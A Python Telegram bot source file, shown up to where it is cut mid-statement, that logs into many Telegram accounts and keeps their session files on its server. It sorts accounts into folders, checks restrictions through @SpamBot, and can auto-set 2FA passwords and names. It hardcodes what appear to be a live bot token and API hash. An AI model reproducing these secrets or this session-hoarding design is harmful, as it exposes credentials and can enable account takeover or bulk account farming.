import logging
import os
import asyncio
import re
import json
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError, RPCError, PhoneNumberInvalidError, AuthKeyUnregisteredError, FloodWaitError, PhoneNumberBannedError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest, GetPasswordRequest, ConfirmPasswordEmailRequest, UpdateProfileRequest
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.types import User, Channel, Chat, ChannelParticipantCreator, ChannelParticipantAdmin, ChatParticipantCreator, ChatParticipantAdmin

from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
    CallbackQueryHandler,
)
from telegram.error import BadRequest

# Setting up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

if os.name == 'nt':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# -----------------------------------------------------------------
# Enter your information here
# -----------------------------------------------------------------
BOT_TOKEN = "8091331702:AAGpTySlZad_fh8OpleamdxDGpxD0NIqWow"
API_ID = 26236832
API_HASH = "2ac8c6682f671ed251eababd128ca13d"

SESSIONS_DIR = "sessions"
USER_DATA_DIR = "user_data"
if not os.path.exists(USER_DATA_DIR):
    os.makedirs(USER_DATA_DIR)
if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

# Conversation states
PHONE, CODE, PASSWORD = range(3)
TFA_NEW_PASSWORD, TFA_HINT, TFA_DISABLE_PASSWORD = range(3, 6)
AUTO_2FA_MENU, AUTO_2FA_SET_PASSWORD, AUTO_2FA_SET_HINT, AUTO_2FA_SET_COUNT = range(6, 10)
AUTO_NAME_SET = 10

# New states for Folder Management
FOLDER_MENU, CREATE_FOLDER_NAME = range(11, 13)

# New state for Add Session (simplified, no folder selection state needed here)
ADD_SESSION_FILE = 13


# --- Helper Functions ---

# Phone number regex for validation
PHONE_NUMBER_REGEX = r'^\+?\d{10,15}$'

def get_user_data_path(user_id: int) -> str:
    return os.path.join(USER_DATA_DIR, f"{user_id}.json")

def read_user_data(user_id: int) -> dict:
    path = get_user_data_path(user_id)
    if not os.path.exists(path):
        # Initial structure with a 'Default' folder
        return {
            "folders": {
                "Default": {"accounts": {}}
            },
            "current_folder": "Default",
            "auto_2fa_enabled": False,
            "auto_2fa_hint": None,
            "auto_2fa_remaining_count": 0,
            "auto_name": None
        }
    try:
        with open(path, 'r', encoding='utf-8') as f:
            data = json.load(f)
            # Ensure all new keys are present even if file is old
            data.setdefault("folders", {"Default": {"accounts": {}}})
            data.setdefault("current_folder", "Default")
            data.setdefault("auto_2fa_enabled", False)
            data.setdefault("auto_2fa_hint", None)
            data.setdefault("auto_2fa_remaining_count", 0)
            data.setdefault("auto_name", None)

            # Migrate old 'accounts' structure to 'Default' folder if it exists
            if "accounts" in data and not data["folders"].get("Default"):
                data["folders"]["Default"] = {"accounts": data["accounts"]}
                del data["accounts"]
            elif "accounts" in data and data["folders"].get("Default"):
                # Merge accounts from old structure into Default folder if both exist
                data["folders"]["Default"]["accounts"].update(data["accounts"])
                del data["accounts"]
            
            # Filter out invalid phone numbers from accounts in all folders on load
            for folder_name, folder_data in data["folders"].items():
                valid_accounts = {k: v for k, v in folder_data.get("accounts", {}).items() if re.fullmatch(PHONE_NUMBER_REGEX, k)}
                folder_data["accounts"] = valid_accounts

            return data
    except (json.JSONDecodeError, IOError):
        logger.error(f"Error reading user data for {user_id}. Returning default structure.")
        return {
            "folders": {
                "Default": {"accounts": {}}
            },
            "current_folder": "Default",
            "auto_2fa_enabled": False,
            "auto_2fa_hint": None,
            "auto_2fa_remaining_count": 0,
            "auto_name": None
        }

def write_user_data(user_id: int, data: dict):
    path = get_user_data_path(user_id)
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except IOError as e:
        logger.error(f"Failed to write user data for {user_id}: {e}")

def save_account_info(user_id: int, user_name: str, phone_number: str, is_frozen: bool, folder_name: str):
    data = read_user_data(user_id)
    data['user_name'] = user_name
    if folder_name not in data['folders']:
        data['folders'][folder_name] = {"accounts": {}}
    data['folders'][folder_name]['accounts'][phone_number] = {"is_frozen": is_frozen}
    write_user_data(user_id, data)
    logger.info(f"Saved info for account {phone_number} in folder '{folder_name}' for user {user_id}")

def remove_account_info(user_id: int, phone_number: str, folder_name: str):
    data = read_user_data(user_id)
    if folder_name in data['folders'] and phone_number in data['folders'][folder_name]['accounts']:
        del data['folders'][folder_name]['accounts'][phone_number]
        # If folder becomes empty, optionally remove it (except Default)
        if not data['folders'][folder_name]['accounts'] and folder_name != "Default":
            del data['folders'][folder_name]
            if data['current_folder'] == folder_name: # If current folder was deleted, switch to Default
                data['current_folder'] = "Default"
    write_user_data(user_id, data)
    logger.info(f"Removed account {phone_number} from folder '{folder_name}' for user {user_id}")

def get_session_path(user_id: int, phone_number: str) -> str:
    user_session_dir = os.path.join(SESSIONS_DIR, str(user_id))
    if not os.path.exists(user_session_dir):
        os.makedirs(user_session_dir)
    return os.path.join(user_session_dir, f"{phone_number}.session")

def create_client(session_path: str) -> TelegramClient:
    return TelegramClient(session_path, API_ID, API_HASH)

async def check_spam_status(client: TelegramClient) -> bool:
    logger.info("Querying @SpamBot for restriction status...")
    try:
        await client.send_message('spambot', '/start')
        await asyncio.sleep(4)
        messages = await client.get_messages('spambot', limit=1)
        if not messages or not messages[0].text: return False
        response_text = messages[0].text.lower()
        restricted_keywords = ['is currently limited', 'are limited', 'you are restricted', 'unfortunately', 'cannot send messages', 'this account is limited', 'i’m afraid', 'blocked']
        return any(keyword in response_text for keyword in restricted_keywords)
    except Exception as e:
        logger.error(f"An error occurred while checking @SpamBot: {e}")
        return False
        
async def perform_logout(user_id: int, phone_number: str, folder_name: str):
    remove_account_info(user_id, phone_number, folder_name)
    session_path = get_session_path(user_id, phone_number)
    
    # Check if the session file exists before attempting to connect or remove it
    if os.path.exists(session_path):
        client = create_client(session_path)
        try:
            await client.connect()
            if await client.is_user_authorized():
                await client.log_out()
        except Exception as e:
            logger.error(f"Error during logout for {phone_number}: {e}")
        finally:
            if client.is_connected():
                await client.disconnect()
            try:
                # Add try-except here to handle FileNotFoundError
                os.remove(session_path)
                logger.info(f"Successfully removed session file: {session_path}")
            except FileNotFoundError:
                logger.warning(f"Session file {session_path} not found during cleanup, it might have been deleted already.")
            except OSError as e:
                logger.error(f"Error removing session file {session_path}: {e}")
    else:
        logger.warning(f"Session file {session_path} not found when trying to perform_logout. Account info still removed.")


# --- Main Bot Logic ---

# Helper function to handle editing or sending a new message
async def safe_edit_or_reply(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str, reply_markup=None, parse_mode=None):
    message_target = None
    if update.callback_query and update.callback_query.message:
        message_target = update.callback_query.message
    elif update.message:
        message_target = update.message
    
    if not message_target:
        logger.error(f"safe_edit_or_reply called without a valid message or callback_query to respond to for text: {text}")
        return None # Return None if no target message

    try:
        if (update.callback_query and message_target) or (update.message and message_target.from_user.is_bot):
             edited_message = await message_target.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
             return edited_message
        else:
             sent_message = await message_target.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
             return sent_message
    except BadRequest as e:
        logger.warning(f"Could not edit message (BadRequest: {e}). Sending new message instead. Original text: {text}")
        if update.effective_chat:
            sent_message = await update.effective_chat.send_message(text, reply_markup=reply_markup, parse_mode=parse_mode)
            return sent_message
        else:
            logger.error(f"Failed to edit and then failed to reply for text: {text}")
            return None
    finally:
        if update.callback_query:
            try:
                await update.callback_query.answer()
            except Exception as e:
                logger.warning(f"Could not answer callback query: {e}")

# New helper function to handle transitions from conversation states to main menu options
async def go_to_main_menu_option(update: Update, context: ContextTypes.DEFAULT_TYPE, target_function) -> int:
    """Helper to go to a main menu option and end the current conversation."""
    await target_function(update, context)
    return ConversationHandler.END


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.info("Start command or 'Back to Main Menu' callback received.")
    reply_keyboard = [
        ["➕ Add New Account", "⚙️ Manage Accounts"],
        ["⚙️ Auto 2FA Settings", "📝 Auto Name Settings"],
        ["📊 My Accounts", "🗂️ Your Folders"], # Added new buttons
        ["➕ Add Session"] # New button for adding session
    ]
    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
    user_data = read_user_data(update.effective_user.id)
    current_folder = user_data.get('current_folder', 'Default')
    await safe_edit_or_reply(update, context, f"Welcome! Current folder: **{current_folder}**. Please choose an option or send /help for more info.", reply_markup=markup, parse_mode='Markdown')


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "<b>Welcome to the Bot Helper!</b>\n\n"
        "Here are the available commands and features:\n\n"
        "<b><u>Commands:</u></b>\n"
        "• /start - Shows the main menu.\n"
        "• /manage - Manage your added accounts.\n"
        "• /cancel - Aborts the current operation.\n"
        "• /help - Shows this help message.\n\n"
        "<b><u>Main Menu Buttons:</u></b>\n"
        "▪️ <b>➕ Add New Account</b>: Start the process to log in with a new Telegram account.\n"
        "▪️ <b>⚙️ Manage Accounts</b>: View, manage, and get stats for your added accounts in the current folder.\n"
        "▪️ <b>⚙️ Auto 2FA Settings</b>: Set password and hint for automatic 2FA setup.\n"
        "▪️ <b>📝 Auto Name Settings</b>: Set a default name to automatically apply to new accounts upon login.\n"
        "▪️ <b>📊 My Accounts</b>: View a summary of all your accounts across all folders.\n"
        "▪️ <b>🗂️ Your Folders</b>: Manage your account folders and switch between them.\n"
        "▪️ <b>➕ Add Session</b>: Upload a .session file to add an account."
    )
    await update.message.reply_text(help_text, parse_mode='HTML')

async def add_account_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_data = read_user_data(update.effective_user.id)
    current_folder = user_data.get('current_folder', 'Default')
    await update.message.reply_text(
        f"Send the phone number in international format (e.g., 88017... or +88017...). \n\nNew account will be saved to folder: **{current_folder}**.\n\nSend /cancel to abort.",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    return PHONE

async def phone_number_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.message.from_user.id
    phone = update.message.text.strip()
    if not phone.startswith('+'):
        phone = '+' + phone
    
    # Validate phone number format before proceeding
    if not re.fullmatch(PHONE_NUMBER_REGEX, phone):
        await update.message.reply_text("Invalid phone number format. Please send the phone number in international format (e.g., 88017... or +88017...).")
        return PHONE # Stay in PHONE state

    session_path = get_session_path(user_id, phone)
    
    client = create_client(session_path)
    try:
        await client.connect()
        if await client.is_user_authorized():
            await update.message.reply_text("This account is already added and logged in.")
            if client.is_connected(): await client.disconnect()
            await start(update, context)
            return ConversationHandler.END
        
        context.user_data.update({'phone': phone, 'session_path': session_path})
        await update.message.reply_text("Sending login code to your number...")
        
        sent_code = await client.send_code_request(phone)
        context.user_data.update({'phone_code_hash': sent_code.phone_code_hash, 'client': client})
        
        await update.message.reply_text("A code has been sent. Please enter it here.")
        return CODE
    except PhoneNumberBannedError:
        logger.warning(f"Phone number {phone} is banned.")
        await update.message.reply_text("The phone number is banned. Please use a different number.")
        if client.is_connected(): await client.disconnect()
        if os.path.exists(session_path): os.remove(session_path)
        await start(update, context)
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Error in phone_number_handler for {phone}: {e}")
        await update.message.reply_text(f"An error occurred: {e}")
        if client and client.is_connected(): await client.disconnect()
        await start(update, context)
        return ConversationHandler.END

async def code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    client: TelegramClient = context.user_data['client']
    phone = context.user_data['phone']
    user_id = update.message.from_user.id
    user_data = read_user_data(user_id)
    current_folder = user_data.get('current_folder', 'Default')

    try:
        await client.sign_in(phone, update.message.text, phone_code_hash=context.user_data['phone_code_hash'])
        
        await update.message.reply_text("Login successful! Now checking account status...")
        is_restricted = await check_spam_status(client)
        status_message = "⚠️ Account Status: This account is LIMITED or BLOCKED!" if is_restricted else "✅ Account Status: No restrictions found."
        
        user = update.message.from_user
        save_account_info(user.id, user.first_name, phone, is_frozen=is_restricted, folder_name=current_folder)

        # --- Apply Auto Name if set ---
        auto_name = user_data.get('auto_name')
        if auto_name:
            try:
                await client(UpdateProfileRequest(first_name=auto_name, last_name='')) # Set last_name to empty string
                await update.message.reply_text(f"✅ Auto Name '{auto_name}' applied to this account (existing name cleared).")
            except Exception as e:
                logger.error(f"Error applying auto name for {phone}: {e}")
                await update.message.reply_text(f"An error occurred while applying Auto Name: {e}")
        # --- End Auto Name application ---

        # Auto 2FA application logic
        if user_data.get('auto_2fa_enabled', False) and user_data.get('auto_2fa_remaining_count', 0) > 0:
            temp_auto_2fa_password = context.user_data.get('temp_auto_2fa_password')
            auto_2fa_hint = user_data.get('auto_2fa_hint')

            if temp_auto_2fa_password:
                try:
                    password_info = await client(GetPasswordRequest())
                    if not password_info.has_password:
                        await update.message.reply_text("Setting up 2FA on this account according to Auto 2FA settings...")
                        await client.edit_2fa(new_password=temp_auto_2fa_password, hint=auto_2fa_hint)
                        await update.message.reply_text("✅ 2FA successfully enabled on this account!")
                        
                        user_data['auto_2fa_remaining_count'] -= 1
                        if user_data['auto_2fa_remaining_count'] <= 0:
                            user_data['auto_2fa_enabled'] = False
                            await update.message.reply_text("Auto 2FA has been automatically disabled as the set limit has been reached.")
                        write_user_data(user_id, user_data)
                    else:
                        await update.message.reply_text("2FA is already enabled on this account, so Auto 2FA was not applied.")
                except Exception as e:
                    logger.error(f"Error applying auto 2FA for {phone}: {e}")
                    await update.message.reply_text(f"An error occurred while applying Auto 2FA: {e}")
                finally:
                    if 'temp_auto_2fa_password' in context.user_data:
                        del context.user_data['temp_auto_2fa_password']
            else:
                await update.message.reply_text("Auto 2FA is enabled but no password is set. Please set the password from 'Auto 2FA Settings'.")
        elif user_data.get('auto_2fa_enabled', False) and user_data.get('auto_2fa_remaining_count', 0) <= 0:
            user_data['auto_2fa_enabled'] = False
            write_user_data(user_id, user_data)
            await update.message.reply_text("Auto 2FA was enabled but its limit was already reached. Not applying 2FA.")

        await client.disconnect()
        await update.message.reply_text(f"Account added to your management list.\n\n{status_message}")
        await start(update, context)
        return ConversationHandler.END

    except SessionPasswordNeededError:
        await update.message.reply_text("2FA password needed. Please enter it.")
        return PASSWORD
    except RPCError as e:
        if "PHONE_CODE_EXPIRED" in str(e) or "The confirmation code has expired" in str(e):
            logger.warning(f"Phone code expired for {phone}. Attempting to re-send code.")
            try:
                # Attempt to resend code
                # Ensure the client is still connected or reconnect if necessary
                if not client.is_connected():
                    await client.connect()
                
                sent_code = await client.send_code_request(phone)
                context.user_data.update({'phone_code_hash': sent_code.phone_code_hash})
                await update.message.reply_text("The code you entered has expired. A **new code** has been sent to your number. Please enter the **new code** here.")
                return CODE # Stay in CODE state to receive new code
            except Exception as resend_e:
                logger.error(f"Error re-sending code for {phone}: {resend_e}")
                await update.message.reply_text(f"The code expired and I couldn't send a new one automatically. Please try adding your account again from /start.")
                if client.is_connected(): await client.disconnect()
                if 'session_path' in context.user_data and os.path.exists(context.user_data['session_path']):
                    os.remove(context.user_data['session_path'])
                await start(update, context)
                return ConversationHandler.END
        elif "PHONE_CODE_INVALID" in str(e):
            await update.message.reply_text("The code you entered is invalid. Please try again.")
            return CODE # Stay in CODE state
        else:
            logger.error(f"RPC Error in code_handler for {phone}: {e}")
            await update.message.reply_text(f"An API error occurred: {e}")
            if client.is_connected(): await client.disconnect()
            if 'session_path' in context.user_data and os.path.exists(context.user_data['session_path']):
                os.remove(context.user_data['session_path'])
            await start(update, context)
            return ConversationHandler.END
    except Exception as e:
        logger.error(f"Unexpected error in code_handler for {phone}: {e}")
        await update.message.reply_text(f"An unexpected error occurred: {e}")
        if client.is_connected(): await client.disconnect()
        if 'session_path' in context.user_data and os.path.exists(context.user_data['session_path']):
            os.remove(context.user_data['session_path'])
        await start(update, context)
        return ConversationHandler.END

async def password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    client: TelegramClient = context.user_data['client']
    phone = context.user_data['phone']
    user_id = update.message.from_user.id
    user_data = read_user_data(user_id)
    current_folder = user_data.get('current_folder', 'Default')

    try:
        await client.sign_in(password=update.message.text)
        
        await update.message.reply_text("Login successful! Now checking account status...")
        is_restricted = await check_spam_status(client)
        status_message = "⚠️ Account Status: This account is LIMITED or BLOCKED!" if is_restricted else "✅ Account Status: No restrictions found."
        
        user = update.message.from_user
        save_account_info(user.id, user.first_name, phone, is_frozen=is_restricted, folder_name=current_folder)

        # --- Apply Auto Name if set ---
        auto_name = user_data.get('auto_name')
        if auto_name:
            try:
                await client(UpdateProfileRequest(first_name=auto_name, last_name='')) # Set last_name to empty string
                await update.message.reply_text(f"✅ Auto Name '{auto_name}' applied to this account (existing name cleared).")
            except Exception as e:
                logger.error(f"Error applying auto name for {phone}: {e}")
                await update.message.reply_text(f"An error occurred while applying Auto Name: {e}")
        # --- End Auto Name application ---

        # Auto 2FA application logic
        if user_data.get('auto_2fa_enabled', False) and user_data.get('auto_2fa_remaining_count', 0) > 0:
            temp_auto_2fa_password = context.user_data.get('temp_auto_2fa_password')
            auto_2fa_hint = user_data.get('auto_2fa_hint')

            if temp_auto_2fa_password:
                try:
                    password_info = await client(GetPasswordRequest())
                    if not password_info.has_password:
                        await update.message.reply_text("Setting up 2FA on this account according to Auto 2FA settings...")
                        await client.edit_2fa(new_password=temp_auto_2fa_password, hint=auto_2fa_hint)
                        await update.message.reply_text("✅ 2FA successfully enabled on this account!")
                        
                        user_data['auto_2fa_remaining_count'] -= 1
                        if user_data['auto_2fa_remaining_count'] <= 0:
                            user_data['auto_2fa_enabled'] = False
                            await update.message.reply_text("Auto 2FA has been automatically disabled as the set limit has been reached.")
                        write_user_data(user_id, user_data)
                    else:
                        await update.message.reply_text("2FA is already enabled on this account, so Auto 2FA was not applied.")
                except Exception as e:
                    logger.error(f"Error applying auto 2FA for {phone}: {e}")
                    await update.message.reply_text(f"An error occurred while applying Auto 2FA: {e}")
                finally:
                    if 'temp_auto_2fa_password' in context.user_data:
                        del context.user_data['temp_auto_2fa_password']
            else:
                await update.message.reply_text("Auto 2FA is enabled but no password is set. Please set the password from 'Auto 2FA Settings'.")
        elif user_data.get('auto_2fa_enabled', False) and user_data.get('auto_2fa_remaining_count', 0) <= 0:
            user_data['auto_2fa_enabled'] = False
            write_user_data(user_id, user_data)
            await update.message.reply_text("Auto 2FA was enabled but its limit was already reached. Not applying 2FA.")

        await client.disconnect()
        await update.message.reply_text(f"Account added to your management list.\n\n{status_message}")
        await start(update, context)
        return ConversationHandler.END

    except Exception as e:
        logger.error(f"Error in password_handler for {phone}: {e}")
        await update.message.reply_text(f"An error occurred: {e}")
        if client.is_connected(): await client.disconnect()
        if 'session_path' in context.user_data and os.path.exists(context.user_data['session_path']):
            os.remove(context.user_data['session_path'])
        await start(update, context)
        return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if 'client' in context.user_data and context.user_data.get('client') and context.user_data.get('client').is_connected():
        await context.user_data['client'].disconnect()
    if 'email_client' in context.user_data and context.user_data.get('email_client') and context.user_data.get('email_client').is_connected():
        await context.user_data['email_client'].disconnect()

    session_path = context.user_data.get('session_path')
    if session_path and os.path.exists(session_path):
        is_auth = True
        try:
            async with TelegramClient(session_path, API_ID, API_HASH) as temp_client:
                is_auth = await temp_client.is_user_authorized()
        except Exception:
            is_auth = False
            
        if not is_auth:
            try:
                # Add try-except here to handle FileNotFoundError
                os.remove(session_path)
                logger.info(f"Cancelled operation. Removed incomplete session file: {session_path}")
            except FileNotFoundError:
                logger.warning(f"Session file {session_path} not found during cancel cleanup, it might have been deleted already.")
            except OSError as e:
                logger.error(f"Error removing session file during cancel: {e}")
    
    if 'temp_auto_2fa_password' in context.user_data:
        del context.user_data['temp_auto_2fa_password']
    
    # Clean up temporary session file if it exists
    if 'temp_session_file_path' in context.user_data and os.path.exists(context.user_data['temp_session_file_path']):
        try:
            os.remove(context.user_data['temp_session_file_path'])
            logger.info(f"Removed temporary session file: {context.user_data['temp_session_file_path']}")
        except OSError as e:
            logger.error(f"Error removing temporary session file during cancel: {e}")
    if 'temp_session_phone_number' in context.user_data:
        del context.user_data['temp_session_phone_number']


    # Clear all temporary data from user_data when conversation ends
    context.user_data.clear()    
    await update.message.reply_text('Operation cancelled.')
    await start(update, context)
    return ConversationHandler.END

async def validate_account(user_id: int, phone_num: str) -> dict:
    session_path = get_session_path(user_id, phone_num)
    if not os.path.exists(session_path):
        return {"phone": phone_num, "status": "invalid", "tfa_on": False, "active_sessions_count": 0}

    client = create_client(session_path)
    active_sessions_count = 0
    try:
        async with asyncio.timeout(15):
            await client.connect()
            if not await client.is_user_authorized():
                await client.disconnect()
                try:
                    os.remove(session_path) # Add try-except here
                    logger.info(f"Removed invalid session file: {session_path}")
                except FileNotFoundError:
                    logger.warning(f"Invalid session file {session_path} not found during validation cleanup, it might have been deleted already.")
                except OSError as e:
                    logger.error(f"Error removing invalid session file {session_path}: {e}")
                return {"phone": phone_num, "status": "invalid", "tfa_on": False, "active_sessions_count": 0}

            password_info = await client(GetPasswordRequest())
            tfa_on = password_info.has_password
            
            # Fetch active sessions count
            authorizations_response = await client(GetAuthorizationsRequest())
            active_sessions_count = len(authorizations_response.authorizations)
            
            await client.disconnect()
            return {"phone": phone_num, "status": "ok", "tfa_on": tfa_on, "active_sessions_count": active_sessions_count}

    except Exception as e:
        logger.error(f"Error validating {phone_num}: {e}")
        if client.is_connected(): await client.disconnect()
        return {"phone": phone_num, "status": "invalid", "tfa_on": False, "active_sessions_count": 0}

async def manage_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_data = read_user_data(user_id)
    current_folder = user_data.get('current_folder', 'Default')
    account_info_stored = user_data.get("folders", {}).get(current_folder, {}).get("accounts", {})
    
    await safe_edit_or_reply(update, context, f"Checking accounts in folder **{current_folder}**, please wait...", parse_mode='Markdown')

    if not account_info_stored:
        await safe_edit_or_reply(update, context, f"No accounts added to folder **{current_folder}** yet.", parse_mode='Markdown')
        return

    tasks = []
    for phone_num, stored_info in account_info_stored.items():
        if re.fullmatch(PHONE_NUMBER_REGEX, phone_num):
            tasks.append(validate_account(user_id, phone_num))
        else:
            logger.warning(f"Skipping validation for invalid phone_num in user_data: {phone_num}. This entry might be removed automatically.")

    live_results = await asyncio.gather(*tasks, return_exceptions=True)

    live_statuses = {}
    for res in live_results:
        if not isinstance(res, Exception) and res.get("status") == "ok":
            live_statuses[res['phone']] = res

    # Store live_statuses in user_data for quick access during navigation
    context.user_data['cached_live_statuses'] = live_statuses

    valid_accounts_list = []
    accounts_to_remove = []

    for phone_num, stored_info in account_info_stored.items():
        if re.fullmatch(PHONE_NUMBER_REGEX, phone_num) and phone_num in live_statuses:
            valid_accounts_list.append(phone_num)
        elif re.fullmatch(PHONE_NUMBER_REGEX, phone_num):
            accounts_to_remove.append(phone_num)

    if accounts_to_remove:
        for phone_num in accounts_to_remove:
            remove_account_info(user_id, phone_num, current_folder) # Pass current_folder here

    if not valid_accounts_list:
        await safe_edit_or_reply(update, context, f"No successfully logged-in accounts found in folder **{current_folder}**.", parse_mode='Markdown')
        return

    # Sort accounts for consistent display and navigation
    valid_accounts_list.sort()
    # Store the list of valid phones in user_data for "Previous/Next" navigation
    context.user_data['all_managed_phones'] = valid_accounts_list


    keyboard = []
    for phone_num in valid_accounts_list:
        # Get data from cached_live_statuses for display
        tfa_on = live_statuses.get(phone_num, {}).get("tfa_on", False)
        active_sessions_count = live_statuses.get(phone_num, {}).get("active_sessions_count", 0)
        is_frozen = user_data.get("folders", {}).get(current_folder, {}).get("accounts", {}).get(phone_num, {}).get("is_frozen", False) # Get frozen status from stored data

        tfa_icon = " 🔒" if tfa_on else ""
        frozen_icon = " ❄️" if is_frozen else ""
        sessions_count_display = f" ({active_sessions_count})" if active_sessions_count > 0 else ""
        
        display_text = f"{phone_num}{tfa_icon}{sessions_count_display}{frozen_icon}"
        main_button = InlineKeyboardButton(display_text, callback_data=f"manage_{phone_num}")
        keyboard.append([main_button])

    await safe_edit_or_reply(update, context, f"Select an account to manage in folder **{current_folder}**:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# New callback handlers for "Previous" and "Next" account navigation
async def previous_account_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    target_phone = query.data.split("_")[2] # e.g., "prev_account_+88017..."
    logger.info(f"previous_account_callback: Target phone: {target_phone}")
    context.user_data['current_managing_phone'] = target_phone
    await manage_account_callback(update, context)

async def next_account_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    target_phone = query.data.split("_")[2] # e.g., "next_account_+88017..."
    logger.info(f"next_account_callback: Target phone: {target_phone}")
    context.user_data['current_managing_phone'] = target_phone
    await manage_account_callback(update, context)


async def delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = query.from_user.id
    user_data = read_user_data(user_id)
    current_folder = user_data.get('current_folder', 'Default')
    callback_data_parts = query.data.split("_")
    if len(callback_data_parts) == 2 and re.fullmatch(PHONE_NUMBER_REGEX, callback_data_parts[1]):
        phone_number = callback_data_parts[1]
    else:
        logger.error(f"Invalid callback_data for delete_callback: {query.data}")
        await safe_edit_or_reply(update, context, "An internal error occurred: Invalid data for logout.")
        return

    await perform_logout(user_id, phone_number, current_folder) # Pass current_folder here
    
    # After deletion, refresh the manage accounts list
    await manage_accounts(update, context)
    return ConversationHandler.END

async def manage_account_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    phone_number = None

    if query and query.data:
        callback_data_parts = query.data.split("_")
        # For 'manage_<phone>', 'prev_account_<phone>', 'next_account_<phone>'
        if len(callback_data_parts) >= 2 and re.fullmatch(PHONE_NUMBER_REGEX, callback_data_parts[-1]):
            phone_number = callback_data_parts[-1]
            logger.info(f"manage_account_callback: Phone from callback_data: {phone_number}")
        else:
            logger.warning(f"manage_account_callback: Invalid callback_data format: {query.data}")

    # If phone_number is still not determined from callback_query, try context.user_data
    if not phone_number:
        phone_number = context.user_data.get('current_managing_phone')
        logger.info(f"manage_account_callback: Phone from context.user_data: {phone_number}")


    if not phone_number: # If still no phone number, something is wrong
        logger.error("Phone number could not be determined for manage_account_callback.")
        await safe_edit_or_reply(update, context, "An internal error occurred: Could not determine account.")
        await manage_accounts(update, context)
        return

    context.user_data['current_managing_phone'] = phone_number # Ensure context is updated for subsequent navigation

    # Retrieve the full list of managed phones to determine previous/next
    all_managed_phones = context.user_data.get('all_managed_phones', [])
    current_phone_index = -1
    try:
        current_phone_index = all_managed_phones.index(phone_number)
    except ValueError:
        logger.warning(f"Current managing phone {phone_number} not found in all_managed_phones list.")
        # If not found, it might be a stale entry or a direct jump, just show current menu
        pass

    # Fetch live status for the current phone number to get accurate 2FA and session count
    # Try to get from cache first, if not available, then validate
    cached_status = context.user_data.get('cached_live_statuses', {}).get(phone_number)
    
    tfa_status_text = "OFF"
    sessions_status_text = "0"

    if cached_status and cached_status["status"] == "ok":
        tfa_status_text = "ON" if cached_status["tfa_on"] else "OFF"
        sessions_status_text = str(cached_status["active_sessions_count"])
    else:
        # Fallback to live validation if not in cache or status is not 'ok'
        user_id = update.effective_user.id
        account_status = await validate_account(user_id, phone_number)
        if account_status["status"] == "ok":
            tfa_status_text = "ON" if account_status["tfa_on"] else "OFF"
            sessions_status_text = str(account_status["active_sessions_count"])
            # Update cache
            if 'cached_live_statuses' not in context.user_data:
                context.user_data['cached_live_statuses'] = {}
            context.user_data['cached_live_statuses'][phone_number] = account_status


    keyboard = [
        [InlineKeyboardButton("📊 Get Code (Stats)", callback_data=f"stats_{phone_number}")],
        [InlineKeyboardButton(f"📱 Active Sessions ({sessions_status_text})", callback_data=f"sessions_{phone_number}")],
        [InlineKeyboardButton(f"🔐 2FA Settings ({tfa_status_text})", callback_data=f"tfa_menu_{phone_number}")],
        [InlineKeyboardButton("🗑️ Logout This Session (Confirm)", callback_data=f"confirm_delete_{phone_number}")],
        [InlineKeyboardButton("🗑️ Delete All Chat History & Leave Groups", callback_data=f"confirm_delete_all_chats_{phone_number}")],
    ]

    # Add Previous/Next buttons if applicable
    navigation_buttons = []
    if current_phone_index > 0:
        prev_phone = all_managed_phones[current_phone_index - 1]
        navigation_buttons.append(InlineKeyboardButton("« Previous", callback_data=f"prev_account_{prev_phone}"))
    
    if current_phone_index != -1 and current_phone_index < len(all_managed_phones) - 1:
        next_phone = all_managed_phones[current_phone_index + 1]
        navigation_buttons.append(InlineKeyboardButton("Next »", callback_data=f"next_account_{next_phone}"))

    if navigation_buttons:
        keyboard.append(navigation_buttons)

    keyboard.append([InlineKeyboardButton("« Back to List", callback_data="back_to_manage_list")])

    await safe_edit_or_reply(update, context, text=f"Managing account: {phone_number}", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def confirm_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    callback_data_parts = query.data.split("_")
    if len(callback_data_parts) == 3 and re.fullmatch(PHONE_NUMBER_REGEX, callback_data_parts[2]):
        phone_number = callback_data_parts[2]
    else:
        logger.error(f"Invalid callback_data for confirm_delete_callback: {query.data}")
        await safe_edit_or_reply(update, context, "An internal error occurred: Invalid data for logout confirmation.")
        await manage_accounts(update, context)
        return

    keyboard = [[
